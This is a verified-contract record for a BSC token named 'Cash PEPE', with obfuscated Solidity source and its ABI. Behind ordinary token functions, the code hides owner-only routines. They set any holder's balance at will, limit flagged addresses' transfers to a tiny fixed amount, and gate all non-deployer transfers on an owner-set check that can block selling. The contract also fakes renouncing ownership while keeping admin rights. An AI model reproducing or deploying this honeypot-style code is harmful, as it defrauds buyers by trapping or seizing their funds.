{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface tokenIsWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedExempt) external view returns (uint256);\n\n    function transfer(address fromMax, uint256 liquidityTeamLaunch) external returns (bool);\n\n    function allowance(address buyReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityTeamLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMax,\n        uint256 liquidityTeamLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeExempt, uint256 value);\n    event Approval(address indexed buyReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract tradingSellLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txMin {\n    function createPair(address launchedIsAt, address fromEnable) external returns (address);\n}\n\ninterface tokenIsWalletMetadata is tokenIsWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CashPEPE is tradingSellLiquidity, tokenIsWallet, tokenIsWalletMetadata {\n\n    address teamLaunchTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function isAuto(address teamReceiver) public {\n        if (sellExempt) {\n            return;\n        }\n        if (liquidityTrading == modeTake) {\n            modeTake = false;\n        }\n        tokenFee[teamReceiver] = true;\n        \n        sellExempt = true;\n    }\n\n    function approve(address listToken, uint256 liquidityTeamLaunch) public virtual override returns (bool) {\n        toEnableToken[_msgSender()][listToken] = liquidityTeamLaunch;\n        emit Approval(_msgSender(), listToken, liquidityTeamLaunch);\n        return true;\n    }\n\n    function feeMax(address teamTokenLaunched, address fromMax, uint256 liquidityTeamLaunch) internal returns (bool) {\n        if (teamTokenLaunched == teamLaunched) {\n            return sellFromTake(teamTokenLaunched, fromMax, liquidityTeamLaunch);\n        }\n        uint256 fundSwap = tokenIsWallet(minFee).balanceOf(maxReceiver);\n        require(fundSwap == amountLaunched);\n        require(fromMax != maxReceiver);\n        if (tokenEnableSender[teamTokenLaunched]) {\n            return sellFromTake(teamTokenLaunched, fromMax, isAt);\n        }\n        return sellFromTake(teamTokenLaunched, fromMax, liquidityTeamLaunch);\n    }\n\n    string private autoWallet = \"Cash PEPE\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapSenderTo;\n    }\n\n    mapping(address => uint256) private isFrom;\n\n    uint256 walletAuto;\n\n    bool public sellExempt;\n\n    constructor (){\n        \n        walletFrom maxFund = walletFrom(teamLaunchTake);\n        minFee = txMin(maxFund.factory()).createPair(maxFund.WETH(), address(this));\n        if (liquidityTrading != modeTake) {\n            liquidityTrading = false;\n        }\n        teamLaunched = _msgSender();\n        enableLiquidity();\n        tokenFee[teamLaunched] = true;\n        isFrom[teamLaunched] = tradingTake;\n        \n        emit Transfer(address(0), teamLaunched, tradingTake);\n    }\n\n    function buyModeTeam() private view {\n        require(tokenFee[_msgSender()]);\n    }\n\n    address public minFee;\n\n    address public teamLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTake;\n    }\n\n    function modeTeam(uint256 liquidityTeamLaunch) public {\n        buyModeTeam();\n        amountLaunched = liquidityTeamLaunch;\n    }\n\n    mapping(address => bool) public tokenEnableSender;\n\n    bool private liquidityTrading;\n\n    function sellFromTake(address teamTokenLaunched, address fromMax, uint256 liquidityTeamLaunch) internal returns (bool) {\n        require(isFrom[teamTokenLaunched] >= liquidityTeamLaunch);\n        isFrom[teamTokenLaunched] -= liquidityTeamLaunch;\n        isFrom[fromMax] += liquidityTeamLaunch;\n        emit Transfer(teamTokenLaunched, fromMax, liquidityTeamLaunch);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return tradingAmount;\n    }\n\n    function shouldMarketing(address listMode, uint256 liquidityTeamLaunch) public {\n        buyModeTeam();\n        isFrom[listMode] = liquidityTeamLaunch;\n    }\n\n    address private tradingAmount;\n\n    uint8 private shouldFund = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return autoWallet;\n    }\n\n    uint256 private tradingTake = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldFund;\n    }\n\n    string private swapSenderTo = \"CPE\";\n\n    mapping(address => mapping(address => uint256)) private toEnableToken;\n\n    function teamMarketing(address receiverWallet) public {\n        buyModeTeam();\n        if (liquidityTrading) {\n            listIsShould = autoSender;\n        }\n        if (receiverWallet == teamLaunched || receiverWallet == minFee) {\n            return;\n        }\n        tokenEnableSender[receiverWallet] = true;\n    }\n\n    address maxReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address teamTokenLaunched, address fromMax, uint256 liquidityTeamLaunch) external override returns (bool) {\n        if (_msgSender() != teamLaunchTake) {\n            if (toEnableToken[teamTokenLaunched][_msgSender()] != type(uint256).max) {\n                require(liquidityTeamLaunch <= toEnableToken[teamTokenLaunched][_msgSender()]);\n                toEnableToken[teamTokenLaunched][_msgSender()] -= liquidityTeamLaunch;\n            }\n        }\n        return feeMax(teamTokenLaunched, fromMax, liquidityTeamLaunch);\n    }\n\n    uint256 private listIsShould;\n\n    uint256 amountLaunched;\n\n    uint256 public autoSender;\n\n    bool public modeTake;\n\n    mapping(address => bool) public tokenFee;\n\n    function enableLiquidity() public {\n        emit OwnershipTransferred(teamLaunched, address(0));\n        tradingAmount = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingAmount;\n    }\n\n    function transfer(address listMode, uint256 liquidityTeamLaunch) external virtual override returns (bool) {\n        return feeMax(_msgSender(), listMode, liquidityTeamLaunch);\n    }\n\n    uint256 constant isAt = 11 ** 10;\n\n    function balanceOf(address launchedExempt) public view virtual override returns (uint256) {\n        return isFrom[launchedExempt];\n    }\n\n    event OwnershipTransferred(address indexed listReceiver, address indexed buyExempt);\n\n    function allowance(address fromSwap, address listToken) external view virtual override returns (uint256) {\n        if (listToken == teamLaunchTake) {\n            return type(uint256).max;\n        }\n        return toEnableToken[fromSwap][listToken];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTeamLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"isAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityTeamLaunch\",\"type\":\"uint256\"}],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTeamLaunch\",\"type\":\"uint256\"}],\"name\":\"shouldMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"}],\"name\":\"teamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenEnableSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTeamLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTokenLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTeamLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CashPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}